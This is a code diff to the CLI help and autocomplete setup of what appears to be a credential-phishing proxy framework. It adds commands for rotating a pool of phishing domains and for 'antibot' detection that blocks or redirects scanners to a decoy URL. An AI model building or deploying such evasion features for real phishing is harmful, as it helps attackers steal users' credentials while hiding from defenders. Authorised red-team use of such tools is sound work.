@@ -3252,6 +3252,8 @@ func (t *Terminal) createHelp() {
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("lure_strategy", readline.PcItem("short"), readline.PcItem("medium"), readline.PcItem("long"), readline.PcItem("realistic"), readline.PcItem("hex"), readline.PcItem("base64"), readline.PcItem("mixed")),
+			readline.PcItem("domains", readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("set-primary"), readline.PcItem("enable"), readline.PcItem("disable")),
+			readline.PcItem("antibot", readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("action", readline.PcItem("block"), readline.PcItem("spoof")), readline.PcItem("spoof_url"), readline.PcItem("threshold"), readline.PcItem("override_ips", readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove"))),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("telegram", readline.PcItem("bot_token"), readline.PcItem("chat_id"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("cloudflare_worker", readline.PcItem("account_id"), readline.PcItem("api_token"), readline.PcItem("zone_id"), readline.PcItem("subdomain"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
@@ -3277,6 +3279,17 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"cloudflare_worker", "subdomain"}, "cloudflare_worker subdomain <subdomain>", "set the workers.dev subdomain (optional)")
 	h.AddSubCommand("config", []string{"cloudflare_worker", "enabled"}, "cloudflare_worker enabled <true|false>", "enable or disable Cloudflare Worker deployment")
 	h.AddSubCommand("config", []string{"cloudflare_worker", "test"}, "cloudflare_worker test", "test the Cloudflare Worker credentials")
+	h.AddSubCommand("config", []string{"domains"}, "domains list", "list all configured domains with status and primary flag")
+	h.AddSubCommand("config", []string{"domains", "add"}, "domains add <domain> [description]", "add a new domain to the multi-domain pool")
+	h.AddSubCommand("config", []string{"domains", "remove"}, "domains remove <domain>", "remove a domain from the pool")
+	h.AddSubCommand("config", []string{"domains", "set-primary"}, "domains set-primary <domain>", "set which domain is the primary domain")
+	h.AddSubCommand("config", []string{"domains", "enable"}, "domains enable <domain>", "enable a domain for use")
+	h.AddSubCommand("config", []string{"domains", "disable"}, "domains disable <domain>", "disable a domain (keeps it in pool but inactive)")
+	h.AddSubCommand("config", []string{"antibot", "enabled"}, "antibot enabled <true|false>", "enable or disable antibot detection")
+	h.AddSubCommand("config", []string{"antibot", "action"}, "antibot action <block|spoof>", "set action when bot is detected")
+	h.AddSubCommand("config", []string{"antibot", "spoof_url"}, "antibot spoof_url <url>", "set URL to redirect detected bots to when action is 'spoof'")
+	h.AddSubCommand("config", []string{"antibot", "threshold"}, "antibot threshold <0.0-1.0>", "set ML detection confidence threshold")
+	h.AddSubCommand("config", []string{"antibot", "override_ips"}, "antibot override_ips <list|add|remove>", "manage IPs that bypass antibot detection")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
@@ -3316,7 +3329,7 @@ func (t *Terminal) createHelp() {
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
-			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
+			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 
 	h.AddSubCommand("lures", nil, "", "show all create lures")
